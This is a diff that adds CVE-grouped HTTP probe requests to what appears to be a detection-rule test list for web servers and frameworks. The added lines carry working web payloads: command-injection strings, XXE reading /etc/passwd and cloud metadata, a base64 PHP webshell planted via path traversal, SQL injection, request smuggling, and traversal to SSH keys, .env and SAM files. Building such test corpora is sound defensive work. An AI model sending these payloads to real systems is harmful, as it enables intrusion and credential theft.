@@ -4,6 +4,8 @@
 #   METHOD TARGET [key=value ...]
 #   - `ua`     sets the User-Agent header
 #   - `body`   sets the request body
+#   - `bodyhex` sets the request body from even-length hex bytes
+#   - `body_file` reads the request body from a file relative to this list
 #   - `header` sets an arbitrary header using `Name: value`
 #   - any other key becomes a request header
 #   - values with spaces or quotes are quoted with "..."; use \" for a literal
@@ -383,3 +385,294 @@ GET /app.swp
 GET /notes.swo
 GET /db.backup
 GET /old-config.old
+
+# ---------------------------------------------------------------------------
+# 2025 CVEs: attacks against HTTP servers and web frameworks.
+#
+# Grouped by advisory family. Requests that cannot be expressed as a single
+# HTTP/1.1 request line (binary Java serialization bodies, compressed ViewState
+# payloads, HTTP/2) are summarized at the end.
+# ---------------------------------------------------------------------------
+
+# --- CVE-2025-29927 (Next.js): middleware authorization bypass ---
+GET /protected header="X-Middleware-Subrequest: middleware"
+GET /protected header="X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
+GET /dashboard header="X-Middleware-Subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+GET /admin header="X-Middleware-Subrequest: pages/_middleware"
+GET /account header="x-middleware-subrequest: src/middleware"
+
+# --- CVE-2025-24813 (Apache Tomcat): partial PUT path equivalence ---
+PUT /payload.session header="Content-Range: bytes 0-5/100" body="ACED0005"
+PUT /payload.session header="Content-Range: bytes 0-5/100" header="Content-Type: application/x-java-serialized-object" bodyhex=aced0005770400000001
+PUT /pocs/session header="Content-Range: bytes 0-1000/1200" body="x"
+PUT /secret.tomcat.cve.txt header="Content-Range: bytes 999-999/1000" body="x"
+GET / header="Cookie: JSESSIONID=.payload"
+GET /index.jsp header="Cookie: JSESSIONID=.poc"
+GET /index.jsp;jsessionid=test123
+
+# --- CVE-2025-31650 (Apache Tomcat): DoS via invalid HTTP priority headers ---
+GET / header="Priority: u=99"
+GET / header="Priority: u=8"
+GET / header="Priority: u=abc"
+GET / header="Priority: u=0, i=2"
+
+# --- CVE-2025-48988 (Apache Tomcat): DoS via a large number of multipart parts ---
+POST /upload header="Content-Type: multipart/form-data; boundary=BOUNDARY" body_file=payloads/tomcat-multipart-flood.txt
+
+# --- CVE-2025-53770 / CVE-2025-53771 / CVE-2025-49704 / CVE-2025-49706
+#     (SharePoint ToolShell): unauthenticated ToolPane abuse ---
+POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx header="Referer: /_layouts/SignOut.aspx" body="MSOTlPn_Uri=http%3A%2F%2Fexample.com%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=CompressedDataTable%3DH4sIAAAAAAAE"
+POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx header="Referer: /_layouts/15/SignOut.aspx" body="MSOTlPn_DWP=Scorecard:ExcelDataSet"
+POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx header="Referer: /_layouts/15/SignOut.aspx" header="Content-Type: application/x-www-form-urlencoded" bodyhex=4d534f546c506e5f4457503d1f8b08000000000002036360a00c000036638d7540000000
+POST /_layouts/15/ToolPane.aspx/?DisplayMode=Edit&a=/ToolPane.aspx header="Referer: /_layouts/SignOut.aspx"
+POST /_layouts/16/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx header="Referer: /_layouts/SignOut.aspx"
+GET /_layouts/15/spinstall0.aspx
+GET /_layouts/15/spinstall0.aspx?cmd=whoami
+
+# --- CVE-2025-5777 (Citrix NetScaler CitrixBleed 2): unauthenticated memory
+#     disclosure via the authentication endpoint ---
+POST /p/u/doAuthentication.do body="login=&passwd=x"
+POST /p/u/doAuthentication.do body="login"
+POST /p/u/doAuthentication.do ua="orange0Mintorange0Mintorange0Mint" body="login"
+POST /nitro/v1/config/login body="login=&passwd=x"
+
+# --- CVE-2025-31324 (SAP NetWeaver Visual Composer): unauthenticated upload ---
+POST /developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1 body="Content-Disposition: form-data; name=\"UPLOAD_METADATA\"; filename=\"helper.jsp\""
+POST /developmentserver/metadatauploader body="Content-Disposition: form-data; name=\"file\"; filename=\"shell.jsp\""
+GET /irj/helper.jsp
+GET /visual_composer/helper.jsp
+POST /sap/bc/webdynpro/sap/ZWDC_METADATA_UPLDR body="Content-Disposition: form-data; name=\"UPLOAD_METADATA\"; filename=\"shell.jsp\""
+
+# --- CVE-2025-3248 (Langflow): unauthenticated RCE via /api/v1/validate/code ---
+POST /api/v1/validate/code header="Content-Type: application/json" body="{\"code\":\"def test(cd=exec('raise Exception(__import__('subprocess').check_output('whoami', shell=True))')): pass\"}"
+POST /api/v1/validate/code header="Content-Type: application/json" body="{\"code\":\"exec('import os; os.system(\\\"whoami\\\"))')\"}"
+POST /api/v1/validate/code header="Content-Type: application/json" body="{\"code\":\"__import__('subprocess').check_output(['id'], shell=True)\"}"
+
+# --- CVE-2025-0108 (PAN-OS): management interface authentication bypass ---
+GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
+GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.js
+GET /unauth/%252e%252e/php/utils.php/PAN_help/x.css
+GET /unauth/%2e%2e/php/ztp_gate.php/PAN_help/x.css
+
+# --- CVE-2025-24893 (XWiki): Groovy injection in SolrSearch RSS output ---
+GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22id%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
+GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22cat%20/etc/passwd%22.execute%28%29.text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
+GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async=false}}{{groovy}}['sh','-c','id'].execute().text{{/groovy}}{{/async}}
+GET /bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Bgroovy%7D%7Did%7B%7B%2Fgroovy%7D%7D
+
+# --- CVE-2025-25257 (Fortinet FortiWeb): pre-auth SQL injection through the
+#     Fabric Connector Authorization header ---
+GET /api/fabric/device/status header="Authorization: Bearer AAAAAA'/**/or/**/sleep(5)--/**/-'"
+GET /api/fabric/device/status header="Authorization: Bearer AAAAAA'or'1'='1"
+GET /api/fabric/device/status header="Authorization: Bearer '/**/UNION/**/SELECT/**/token/**/from/**/fabric_user.user_table/**/into/**/outfile/**/'../../lib/python3.10/site-packages/x.pth'"
+
+# --- CVE-2025-32432 (Craft CMS): Yii behavior injection in the asset
+#     transform action ---
+POST /index.php?p=admin/actions/assets/generate-transform header="Content-Type: application/json" body="{\"assetId\":11,\"handle\":{\"width\":123,\"height\":123,\"as session\":{\"class\":\"craft\\behaviors\\FieldLayoutBehavior\",\"__class\":\"GuzzleHttp\\Psr7\\FnStream\",\"__construct()\":[[]],\"_fn_close\":\"phpinfo\"}}}"
+POST /index.php?p=admin/actions/assets/generate-transform header="Content-Type: application/json" body="{\"assetId\":11,\"handle\":{\"width\":123,\"height\":123,\"as hack\":{\"class\":\"yii\\rbac\\PhpManager\",\"__construct()\":[{\"itemFile\":\"/var/log/nginx/access.log\"}]}}}"
+
+# --- CVE-2025-49132 (Pterodactyl Panel): path traversal and PEAR abuse in
+#     the locale loader ---
+GET /locales/locale.json?locale=../../../../../../tmp&namespace=payload
+GET /locales/locale.json?locale=..%2F..%2F..%2F..%2F..%2F..%2Ftmp&namespace=payload
+GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd
+
+# --- CVE-2025-4427 / CVE-2025-4428 (Ivanti EPMM): unauthenticated expression
+#     language injection in the feature usage API ---
+GET /mifs/rs/api/v2/featureusage?format=%24%7B%27%27.getClass().forName(%27java.util.Scanner%27).getConstructor(%27%27.getClass().forName(%27java.io.InputStream%27)).newInstance(%27%27.getClass().forName(%27java.lang.Runtime%27).getMethod(%27getRuntime%27).invoke(null).exec(%27id%27).getInputStream()).useDelimiter(%27%5C%5CA%27).next()%7D
+GET /mifs/rs/api/v2/featureusage?format=%24%7B%27%27.getClass().forName(%27java.lang.Runtime%27).getMethod(%27getRuntime%27).invoke(null).exec(%27id%27).getInputStream()%7D
+
+# --- CVE-2025-58360 (GeoServer): unauthenticated XXE in WMS SLD parsing ---
+POST /geoserver/wms?service=WMS&version=1.1.0&request=GetMap&width=100&height=100&format=image/png header="Content-Type: application/vnd.ogc.sld+xml" body="<?xml version=\"1.0\"?><!DOCTYPE StyledLayerDescriptor [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><StyledLayerDescriptor version=\"1.0.0\"><NamedLayer><Name>&xxe;</Name></NamedLayer></StyledLayerDescriptor>"
+POST /geoserver/ows?service=WMS&request=GetMap&format=image/png body="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>"
+
+# --- CVE-2025-47812 (Wing FTP Server): Lua injection through the login
+#     username null byte ---
+POST /loginok.html header="Content-Type: application/x-www-form-urlencoded" body="username=anonymous%00]]%0dlocal+h+%3d+io.popen(%22id%22)%0dh%3aclose()%0d--&password="
+POST /loginok.html header="Content-Type: application/x-www-form-urlencoded" body="username=anonymous%00]]%0dlocal+h+%3d+io.popen(%22cat%20/etc/passwd%22)%0dh%3aclose()%0d--&password="
+
+# --- 2025 attack classes left out ---
+# CVE-2025-23006 (SonicWall) and CVE-2025-22457 (Ivanti): the public reports
+#   describe proprietary or overflow payloads without a reproducible HTTP
+#   request shape, so no probes are listed.
+# CVE-2025-25257 (FortiWeb): the RCE step needs MySQL FILE privileges and a
+#   follow-up request to the dropped webshell; the probes carry the header SQLi.
+# CVE-2025-32432 (Craft CMS): execution needs a PHP payload planted in a log or
+#   session file first; the probes carry the behavior-injection JSON.
+# CVE-2025-47812 (Wing FTP): the injected Lua runs when a later request loads
+#   the poisoned session; the probes carry the injection into /loginok.html.
+# CVE-2025-58360 (GeoServer): exfiltration needs an attacker-controlled DTD or
+#   a blind channel; the probes carry the XXE body.
+
+# ---------------------------------------------------------------------------
+# 2026 CVEs: attacks against HTTP servers and web frameworks.
+#
+# Grouped by advisory family. Requests that cannot be expressed as a single
+# HTTP/1.1 request line (HTTP/2, TLS, huge header blocks, raw chunk framing,
+# multipart CR/LF) are summarized at the end.
+# ---------------------------------------------------------------------------
+
+# --- CVE-2026-79768 (httpd mod_userdir): '/./' path equivalence ---
+GET /~user/./private/file.txt
+GET /~admin/./config.php
+GET /~admin/.//backup.tar.gz
+GET /~root/./.ssh/id_rsa
+GET /~user/%2e/secret.txt
+
+# --- CVE-2026-63718 (httpd mod_proxy_uwsgi), CVE-2026-8646 (WebSphere),
+#     CVE-2026-11806 (WebSphere Liberty), CVE-2026-23941 / CVE-2026-73812
+#     (Erlang OTP inets): request smuggling via Transfer-Encoding / Content-Length ---
+POST /api/items body=x header="Transfer-Encoding: chunked"
+POST /api/items body=x header="Transfer-Encoding: chunked" header="Content-Length: 1"
+POST /api/items body=x header="Content-Length: 0"
+POST /api/items body=x header="Transfer-Encoding: chunked, identity"
+POST /api/items body=x header="Transfer-Encoding: xchunked"
+POST /api/items body=x header="Transfer-Encoding: chunked" header="Content-Length: 0" header="Content-Length: 1"
+GET / header="Transfer-Encoding: chunked"
+GET /?q=1%0d%0aTransfer-Encoding:%20chunked
+GET /?q=1%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/internal
+GET /?next=/%0d%0aHost:%20internal
+POST /xml body="<?xml version=\"1.0\"?>" header="Transfer-Encoding: chunked"
+
+# --- CVE-2026-2332 (Jetty) and CVE-2026-24880 (Tomcat): chunk extension smuggling ---
+GET /?q=1;ext=%22%0d%0aGET%20/admin
+GET /?q=1;ext=%22%20HTTP/1.1%0d%0aHost:%20internal
+GET /?q=chunk;ext=%22x%0d%0a0%0d%0a%0d%0aGET%20/private
+
+# --- CVE-2026-48710 (BadHost, Starlette / FastAPI): Host header path confusion ---
+GET /admin header="Host: example.com/health?x="
+GET /admin header="Host: foo/bar"
+GET /admin header="Host: example.com#frag"
+GET /admin header="Host: example.com:80/anything"
+GET /v1/models header="Host: localhost:8000/foo"
+GET /admin header="X-Forwarded-Host: example.com/health?x="
+GET /admin header="X-Forwarded-Host: localhost/foo"
+
+# --- CVE-2026-44574 / CVE-2026-44575 (Next.js): middleware authorization bypass ---
+GET /safe?nxtPslug=secret-page&__nextDefaultLocale=&__nextLocale= header="x-matched-path: /admin/[slug]" header="x-now-route-matches: 1=secret-page"
+GET /safe?nxtPslug=admin header="x-matched-path: /admin/[slug]" header="x-now-route-matches: 1=admin"
+GET /safe?nxtIslug=secret-page
+GET /safe?nxtPslug=secret-page&nxtIslug=secret-page
+GET /admin/foo%252Fsecret-page
+GET /admin%252Fsecret-page
+GET /admin.rsc
+GET /dashboard/secret.rsc
+GET /admin.rsc?nxtPslug=secret-page
+GET /secret-page.rsc
+GET /admin header="RSC: 1"
+
+# --- CVE-2026-27971 (Qwik): RPC deserialization via application/qwik-json ---
+POST /?qfunc=sync header="Content-Type: application/qwik-json" header="X-QRL: sync" body="{\"_objs\":[\"\\u0002./node_modules/cross-spawn/index#sync\",\"cat\",\"/etc/passwd\",[\"2\"],[\"0\",\"1\",\"3\"]],\"_entry\":\"4\"}"
+POST /?qfunc=run header="Content-Type: application/qwik-json" body="{\"_objs\":[\"\\u0002./node_modules/cross-spawn/index#sync\",\"id\"],\"_entry\":\"2\"}"
+POST /?qfunc=exec header="Content-Type: application/qwik-json" body="{\"_objs\":[\"\\u0002./node_modules/cross-spawn/index#sync\",\"bash\",\"-c\",\"id\"],\"_entry\":\"3\"}"
+
+# --- CVE-2026-63077 (JetBrains TeamCity): unauthenticated agent protocol RCE ---
+POST /app/agents/v1/register header="Content-Type: application/xml" body="<agent><name>scan-agent</name><authToken>1234567890</authToken><agentAddress>127.0.0.1:9090</agentAddress></agent>"
+POST /app/agents/v1/commands/error header="TeamCity-AgentSessionId: 1" header="Content-Type: application/xml" body="<linked-hash-map><entry><HSQLMetadataStorage_-SchemaMismatchException><myDataSource class=\"org.apache.commons.dbcp2.BasicDataSource\"><driverClassName>org.hsqldb.jdbcDriver</driverClassName><url>jdbc:hsqldb:mem:tc</url><connectionInitSqls><string>SCRIPT '../webapps/ROOT/pwn.jspws'</string></connectionInitSqls></myDataSource></HSQLMetadataStorage_-SchemaMismatchException></entry></linked-hash-map>"
+POST /app/agents/v1/commands/error header="TeamCity-AgentSessionId: 1" header="Content-Type: application/xml" body="<linked-hash-map><entry><com.thoughtworks.xstream.converters.ConversionException/><org.apache.commons.dbcp2.BasicDataSource><connectionInitSqls>SCRIPT '../webapps/ROOT/pwn.jspws'</connectionInitSqls></org.apache.commons.dbcp2.BasicDataSource></entry></linked-hash-map>"
+GET /pwn.jspws
+GET /shell.jspws
+
+# --- CVE-2026-85706 (GitLab CE/EE): unauthenticated file read via commits/files API ---
+POST /api/v4/projects/1/repository/%63ommits?file=&file.path=/etc/passwd&file.size=1&Content-Type=application%2Fx-www-form-urlencoded header="Content-Type: application/x-www-form-urlencoded"
+POST /api/v4/projects/1/repository/commits/?file=&file.path=/etc/passwd&file.size=1 header="Content-Type: application/x-www-form-urlencoded"
+POST /api/v4/projects/1/repository/commits.json?file=&file.path=/var/opt/gitlab/gitlab-rails/etc/gitlab.yml&file.size=1 header="Content-Type: application/x-www-form-urlencoded"
+POST /api/v4/projects/1/%72epository/commits?file=&file.path=/etc/passwd&file.size=1 header="Content-Type: application/x-www-form-urlencoded"
+POST /api/v4/projects/1/repository/files/vfile.txt/?file=&file.path=/etc/passwd&file.size=1 header="Content-Type: application/x-www-form-urlencoded"
+PUT /api/v4/projects/1/repository/files/vfile.txt/?file=&file.path=/etc/passwd&file.size=1 header="Content-Type: application/x-www-form-urlencoded"
+
+# --- CVE-2026-5027 (Langflow) and CVE-2025-71334 (Flowise, disclosed 2026):
+#     unauthenticated file write / read via traversal in upload and download paths ---
+POST /api/v2/files body="Content-Disposition: form-data; name=\"file\"; filename=\"../../etc/cron.d/pwn\""
+POST /api/v2/files body="Content-Disposition: form-data; name=\"file\"; filename=\"../../../../var/www/html/shell.php\""
+POST /api/v2/files body="Content-Disposition: form-data; name=\"file\"; filename=\"../../../../root/.ssh/authorized_keys\""
+POST /api/v2/files body="Content-Disposition: form-data; name=\"file\"; filename=\"..%2F..%2F..%2F.env\""
+GET /api/v1/get-upload-file?chatflowId=../../../../.env
+GET /api/v1/get-upload-file?chatflowId=..%2F..%2F..%2F..%2F.env
+GET /api/v1/openai-assistants-file/download?chatflowId=../../../../.env
+POST /api/v1/chatflows?chatflowId=../../../../var/www/html/shell.php body="PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
+POST /api/v1/chatflows?chatflowId=..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php body="PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
+
+# --- CVE-2026-19264 (Postiz): unauthenticated arbitrary file read under /uploads ---
+GET /uploads/..%2F..%2F..%2F.env
+GET /uploads/..%2F..%2F..%2Fproc%2Fself%2Fenviron
+GET /uploads/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+GET /uploads/..%2F..%2F..%2Fetc%2Fpasswd
+
+# --- CVE-2026-8023 (Zephyr static filesystem) and CVE-2026-55846 (Allure report):
+#     path traversal with raw or encoded dot segments ---
+GET //../../
+GET //../../etc/passwd
+GET //../../config/settings
+GET /../../../etc/passwd
+GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd
+GET /../../../proc/self/environ
+GET /../../../home/user/.ssh/id_rsa
+
+# --- CVE-2026-50559 (Quarkus) and CVE-2026-73551 (Envoy): path normalization bypass ---
+GET /admin%3Bfoo=bar/dashboard
+GET /admin;foo=bar/dashboard
+GET /protected%2Fsecret.txt
+GET /protected%5Csecret.txt
+GET /static%2F..%2Fadmin
+GET /user/..;foo=bar/admin
+GET /public/..;x=y/private
+GET /api/..;/admin
+
+# --- CVE-2026-67282 (Joomla Fabrik) and CVE-2026-77647 (SPIP): unauthenticated PHP code injection ---
+GET /index.php?option=com_fabrik&view=list&listid=1&t___e[eval]=1&t___e[value]=system('id')
+GET /index.php?option=com_fabrik&view=list&listid=1&t___e%5Beval%5D=1&t___e%5Bvalue%5D=phpinfo()
+GET /index.php?option=com_fabrik&view=list&listid=1&t___e%5Beval%5D=1&t___e%5Bvalue%5D=usleep(3000000)
+GET /spip.php?xyz=%0Aheader(%22X-Spip-Filtre:%20intval|phpinfo%22);%0A
+GET /spip.php?xyz=%0Aheader(%22X-Spip-Filtre:%20intval|_request|system%22);%0A
+POST /spip.php?xyz=%0Aheader(%22X-Spip-Filtre:%20intval|_request|system%22);%0A body="0=id"
+
+# --- CVE-2026-84671 / CVE-2026-70428 (Jenkins): file parameter path traversal ---
+POST /job/test/build?delay=0sec body="name=../../init.groovy.d/pwn.groovy"
+POST /job/test/build?delay=0sec body="file.name=..\\..\\plugins\\pwn.jpi"
+POST /job/test/build?delay=0sec body="name=/var/lib/jenkins/init.groovy.d/pwn.groovy"
+POST /createItem?name=pwn body="name=..\\..\\init.groovy.d\\pwn.groovy"
+
+# --- Apache httpd 2.4.69 request-driven flaws ---
+# CVE-2026-42528 (mod_dav shared lock overflow)
+LOCK /dav/file.txt header="Timeout: Infinite, Second-4100000000" body="<?xml version=\"1.0\"?><D:lockinfo xmlns:D=\"DAV:\"><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype><D:owner>attacker</D:owner></D:lockinfo>"
+LOCK /dav/file.txt header="Depth: infinity" header="Timeout: Second-9999999999"
+# CVE-2026-58415 (mod_dav_fs .DAV property database read)
+GET /dav/.DAV/
+GET /dav/.DAV/props.xml
+GET /.DAV/
+GET /webdav/files/.DAV/ns/
+# CVE-2026-93546 (mod_dav_fs PROPPATCH namespace flood)
+PROPPATCH /dav/file.txt body="<?xml version=\"1.0\"?><D:propertyupdate xmlns:D=\"DAV:\" xmlns:A0=\"urn:x0\" xmlns:A1=\"urn:x1\" xmlns:A2=\"urn:x2\" xmlns:A3=\"urn:x3\" xmlns:A4=\"urn:x4\"><D:set><D:prop><A0:p/><A1:p/><A2:p/><A3:p/><A4:p/></D:prop></D:set></D:propertyupdate>"
+# CVE-2026-59685 (Windows 8.3 short-name expansion)
+GET /PROGRA~1/
+GET /PROGRA~1/win.ini
+GET /DOCUME~1/
+GET /WINDOW~1/system32/config/SAM
+# CVE-2026-48005 / CVE-2026-73636 / CVE-2026-73637 (mod_auth_digest reauth, replay, concurrency)
+GET / header="Authorization: Digest username=\"admin\", realm=\"protected\", nonce=\"1\", uri=\"/\", response=\"00000000000000000000000000000000\""
+GET / header="Authorization: Digest username=\"admin\", realm=\"protected\", nonce=\"1\", nc=00000001, cnonce=\"1\", qop=auth, uri=\"/\", response=\"0\""
+GET /admin header="Authorization: Digest username=\"admin\", realm=\"protected\", nonce=\"replay\", uri=\"/admin\", response=\"ffffffffffffffffffffffffffffffff\""
+
+# --- SYSS-2026-022 (IIS on Windows Server 2025): multi-Range resource exhaustion ---
+GET /script.js header="Range: bytes=0-,0-,0-,0-,0-,0-,0-,0-,0-,0-"
+GET /script.js header="Range: bytes=0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-"
+
+# --- 2026 protocol-level attacks that a single HTTP/1.1 request line cannot express ---
+# CVE-2026-42945 / CVE-2026-42533 / CVE-2026-42926 / CVE-2026-40460 (nginx):
+#   rewrite/stream/HTTP2/HTTP3 memory corruption; needs connection-level framing
+#   or a configuration-specific rewrite surface.
+# CVE-2026-49975 / CVE-2026-49160 (HTTP/2 compression bomb) and CVE-2026-47291
+#   (Windows HTTP.sys, >65535-byte request): need HTTP/2 frames or header blocks
+#   far beyond the request-size limits enforced by the listener.
+# CVE-2026-63292 (httpd mod_vhost_alias): Host header longer than 8192 bytes.
+# CVE-2026-52747 / CVE-2026-52761 (ModSecurity): multipart field values carrying
+#   raw CR/LF. bodyhex/body_file can carry the bytes, but a reliable rule needs
+#   multipart-aware parsing; matching raw CR/LF would hit legitimate multipart
+#   structure, so no rule is shipped.
+# CVE-2026-29170 (httpd mod_proxy_ftp XSS): payload arrives in FTP directory
+#   names, not in the HTTP request itself.
+# CVE-2026-34355 / CVE-2026-34356 / CVE-2026-56449 / CVE-2026-63686 (httpd
+#   mod_proxy_*): triggered by a malicious upstream response, not by a request.
+# CVE-2026-56154 / CVE-2026-57941 / CVE-2026-48913 (httpd): config-dependent
+#   lookahead or HTTP/2-triggered memory corruption.
